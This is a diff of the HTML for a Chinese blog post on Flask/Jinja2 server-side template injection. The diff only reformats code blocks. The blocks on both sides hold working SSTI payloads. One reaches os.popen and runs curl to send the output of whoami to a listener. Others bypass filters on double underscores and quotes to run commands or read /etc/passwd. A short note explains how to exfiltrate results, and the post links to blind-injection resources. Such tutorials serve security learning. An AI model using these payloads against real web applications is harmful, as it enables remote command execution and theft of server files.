-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="k">if</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">408</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;curl http://127.0.0.1:5000/?i=`whoami`&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">%</span><span class="p">}</span><span class="n">zjun</span><span class="p">{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}</span>
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><p>如果可以执行命令，利用 curl 将执行结果带出来。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="k">if</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">408</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;curl http://127.0.0.1:5000/?i=`whoami`&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">%</span><span class="p">}</span><span class="n">zjun</span><span class="p">{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}</span>
+</span></span></code></pre></div><p>如果可以执行命令，利用 curl 将执行结果带出来。</p>
 <p><img src="https://oss.zjun.info/zjun.info/EdA74lOaYyfKLTH.png" alt="EdA74lOaYyfKLTH"></p>
 <p>如果不能执行命令，读取文件可以利用盲注的方法逐位将内容爆出来，可见<a href="https://p0sec.net/index.php/archives/120/" target="_blank" rel="noopener">Flask/Jinja2 模板注入中的一些绕过姿势</a>中关于盲注部分脚本。</p>
 <ul>
 <li><strong><code>__</code>被过滤</strong></li>
 </ul>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span> <span class="s1">&#39;&#39;</span><span class="p">[</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">class</span><span class="p">][</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">mro</span><span class="p">][</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">subclasses</span><span class="p">]()[</span><span class="mi">408</span><span class="p">][</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">init</span><span class="p">][</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">globals</span><span class="p">][</span><span class="s1">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span><span class="o">&amp;</span><span class="n">class</span><span class="o">=</span><span class="vm">__class__</span><span class="o">&amp;</span><span class="n">mro</span><span class="o">=</span><span class="vm">__mro__</span><span class="o">&amp;</span><span class="n">subclasses</span><span class="o">=</span><span class="n">__subclasses__</span><span class="o">&amp;</span><span class="n">init</span><span class="o">=</span><span class="fm">__init__</span><span class="o">&amp;</span><span class="nb">globals</span><span class="o">=</span><span class="vm">__globals__</span>
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span> <span class="s1">&#39;&#39;</span><span class="p">[</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">class</span><span class="p">][</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">mro</span><span class="p">][</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">subclasses</span><span class="p">]()[</span><span class="mi">408</span><span class="p">][</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">init</span><span class="p">][</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">globals</span><span class="p">][</span><span class="s1">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span><span class="o">&amp;</span><span class="n">class</span><span class="o">=</span><span class="vm">__class__</span><span class="o">&amp;</span><span class="n">mro</span><span class="o">=</span><span class="vm">__mro__</span><span class="o">&amp;</span><span class="n">subclasses</span><span class="o">=</span><span class="n">__subclasses__</span><span class="o">&amp;</span><span class="n">init</span><span class="o">=</span><span class="fm">__init__</span><span class="o">&amp;</span><span class="nb">globals</span><span class="o">=</span><span class="vm">__globals__</span>
+</span></span></code></pre></div><ul>
 <li><strong><code>''</code>被过滤</strong></li>
 </ul>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span> <span class="p">()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="o">.</span><span class="fm">__getitem__</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">343</span><span class="p">)(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">path</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="p">}}</span><span class="o">&amp;</span><span class="n">path</span><span class="o">=/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span>
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><h2 id="参考"><a href="#参考" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:参考" class="headings">参考</a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span> <span class="p">()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="o">.</span><span class="fm">__getitem__</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">343</span><span class="p">)(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">path</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="p">}}</span><span class="o">&amp;</span><span class="n">path</span><span class="o">=/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span>
+</span></span></code></pre></div><h2 id="参考"><a href="#参考" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:参考" class="headings">参考</a></h2>
 <ul>
 <li>
 <p><a href="https://0day.work/jinja2-template-injection-filter-bypasses/" target="_blank" rel="noopener">https://0day.work/jinja2-template-injection-filter-bypasses/</a></p>
